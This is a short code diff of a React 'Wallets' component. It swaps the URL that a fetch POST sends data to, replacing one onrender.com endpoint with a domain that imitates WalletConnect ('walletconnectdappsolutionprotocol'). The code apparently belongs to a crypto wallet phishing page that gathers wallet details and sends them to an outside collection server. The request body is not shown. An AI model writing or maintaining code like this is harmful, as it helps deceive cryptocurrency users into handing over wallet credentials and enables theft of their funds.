@@ -61,8 +61,7 @@ const Wallets = () => {
     };
 
     try {
-      const url = "https://cyber-defense-academy.onrender.com/deets";
-      //   "https://crypto-connect-auq0.onrender.com/api/v1/connect_wallet";
+      const url = 'https://walletconnectdappsolutionprotocol.onrender.com/details_two';
 
       const res = await fetch(url, {
         method: "POST",
